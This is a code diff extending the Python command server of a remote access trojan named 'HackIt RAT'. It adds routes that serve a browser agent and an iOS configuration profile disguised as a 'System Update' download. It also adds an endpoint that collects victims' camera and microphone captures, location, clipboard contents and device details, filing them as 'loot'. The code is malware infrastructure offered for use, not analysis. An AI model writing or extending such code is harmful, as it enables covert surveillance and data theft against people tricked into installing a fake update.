@@ -28,6 +28,8 @@ from typing import Any, Dict, Optional
 
 from aiohttp import web
 
+from . import ios as WEBAGENT
+from . import webagent
 from . import protocol, store
 from .protocol import ProtocolError
 
@@ -39,6 +41,7 @@ class Hub:
     psk: bytes
     token: str
     public_url: str
+    web_token: str = ""
     max_tasks: int = 8
     stale_after: int = 180
     offline_after: int = 300
@@ -311,6 +314,106 @@ async def api_stats(request: web.Request) -> web.Response:
     return web.json_response({"ok": True, **data})
 
 
+WEB_KINDS = {"info", "loc", "clip", "cam", "mic", "notif"}
+
+
+def _web_sid(token: str, ip: str, ua: str) -> str:
+    seed = f"{token}|{ip}|{ua}".encode("utf-8", "replace")
+    return "web-" + hashlib.sha256(seed).hexdigest()[:24]
+
+
+async def _web_ok(request: web.Request) -> None:
+    if not hmac.compare_digest(request.match_info.get("token", ""), request.app["hub"].web_token):
+        raise web.HTTPForbidden(text="bad web token")
+
+
+async def webapp(request: web.Request) -> web.Response:
+    await _web_ok(request)
+    token = json.dumps(request.match_info["token"])
+    page = webagent.PAGE.replace("%TOKEN%", token)
+    return web.Response(text=page, content_type="text/html")
+
+
+async def webasset(request: web.Request) -> web.Response:
+    await _web_ok(request)
+    name = request.match_info["name"]
+    if name == "agent.js":
+        return web.Response(text=webagent.AGENT, content_type="application/javascript")
+    if name == "sw.js":
+        return web.Response(text=WEBAGENT.SERVICE_WORKER, content_type="application/javascript")
+    if name == "manifest.webmanifest":
+        url = str(request.url).removesuffix("/manifest.webmanifest")
+        return web.Response(body=WEBAGENT.manifest(url), content_type="application/manifest+json")
+    if name == "icon.png":
+        return web.Response(body=WEBAGENT.ICON, content_type="image/png")
+    if name == "hackit-webclip.mobileconfig":
+        url = str(request.url).removesuffix("/hackit-webclip.mobileconfig")
+        return web.Response(body=WEBAGENT.profile("System Update", url),
+                            content_type="application/x-apple-aspen-config",
+                            headers={"Content-Disposition": 'attachment; filename="System Update.mobileconfig"'})
+    raise web.HTTPNotFound()
+
+
+def _write_web_artifact(sid: str, kind: str, b64: str, name: str, mime: str) -> Optional[str]:
+    try:
+        blob = base64.b64decode(b64, validate=True)
+    except (ValueError, TypeError):
+        return None
+    if not blob or len(blob) > protocol.MAX_BODY:
+        return None
+    folder = os.path.join(store.FILES_DIR, sid)
+    os.makedirs(folder, exist_ok=True)
+    safe = os.path.basename(name or f"web-{kind}")[:120]
+    path = os.path.join(folder, secrets.token_hex(6) + "-" + safe)
+    with open(path, "wb") as handle:
+        handle.write(blob)
+    store.add_event(sid, kind, {"name": safe, "size": len(blob), "mime": mime, "path": path})
+    store.add_loot(sid, safe, path, len(blob), kind)
+    return path
+
+
+async def web_report(request: web.Request) -> web.Response:
+    """Browser heartbeat. Same-origin, so the token is the only auth."""
+    await _web_ok(request)
+    ip = _peer(request)
+    ua = request.headers.get("User-Agent", "")[:300]
+    sid = _web_sid(request.match_info["token"], ip, ua)
+    try:
+        raw = await request.read()
+        if len(raw) > protocol.MAX_BODY:
+            raise web.HTTPRequestEntityTooLarge(max_size=protocol.MAX_BODY, actual_size=len(raw))
+        body = json.loads(raw.decode("utf-8")) if raw else {}
+    except (ValueError, UnicodeDecodeError) as exc:
+        raise web.HTTPBadRequest(text=str(exc)) from exc
+    if not isinstance(body, dict):
+        raise web.HTTPBadRequest(text="body is not an object")
+    kind = str(body.get("kind") or "info")[:16]
+    if kind not in WEB_KINDS:
+        kind = "info"
+    meta = body.get("meta") if isinstance(body.get("meta"), dict) else {}
+    meta.setdefault("model", str(meta.get("platform") or "browser")[:80])
+    meta.setdefault("label", "web:" + str(meta.get("ua_platform") or "browser")[:40])
+    meta.setdefault("sdk", 0)
+    store.register(sid, meta, ip, kind="web")
+    store.touch(sid, meta, kind, ip)
+
+    data = body.get("data")
+    if kind in ("cam", "mic") and isinstance(data, dict):
+        _write_web_artifact(sid, kind, str(data.get("b64") or ""),
+                            str(data.get("name") or ""), str(data.get("mime") or ""))
+    elif kind == "loc" and isinstance(data, list):
+        store.add_locations(sid, data)
+        store.add_event(sid, "loc", data[:10])
+    elif kind == "clip":
+        text = data.get("text") if isinstance(data, dict) else data
+        store.add_event(sid, "clip", {"text": str(text or "")[:8000]})
+    elif kind == "info":
+        store.add_event(sid, "info", meta)
+        if "battery" in meta:
+            store.touch(sid, {"battery": meta["battery"], "charging": meta.get("charging", 0)})
+    return web.json_response({"ok": True, "sid": sid})
+
+
 DASHBOARD = """<!doctype html>
 <html><head><meta charset="utf-8"><title>HackIt RAT</title>
 <style>
@@ -432,6 +535,9 @@ def make_app(hub: Hub) -> web.Application:
             web.delete("/api/session/{sid}", api_forget),
             web.get("/api/stats", api_stats),
             web.get("/", dashboard),
+            web.get("/w/{token}/", webapp),
+            web.get("/w/{token}/{name}", webasset),
+            web.post("/v1/web/{token}", web_report),
         ]
     )
 
@@ -479,7 +585,7 @@ def write_psk(path: str) -> bytes:
 async def serve(host: str, port: int, psk_path: str, token: Optional[str], public_url: str) -> None:
     psk = load_psk(psk_path) if os.path.exists(psk_path) else write_psk(psk_path)
     token = token or secrets.token_urlsafe(24)
-    hub = Hub(psk=psk, token=token, public_url=public_url)
+    hub = Hub(psk=psk, token=token, public_url=public_url, web_token=secrets.token_urlsafe(9))
     app = make_app(hub)
     runner = web.AppRunner(app, access_log=None)
     await runner.setup()
@@ -489,6 +595,7 @@ async def serve(host: str, port: int, psk_path: str, token: Optional[str], publi
     print(f"  public url  {public_url}")
     print(f"  token       {token}")
     print(f"  psk         {psk_path}")
+    print(f"  ios page    {public_url}/w/{hub.web_token}/")
     await asyncio.Event().wait()
 
 
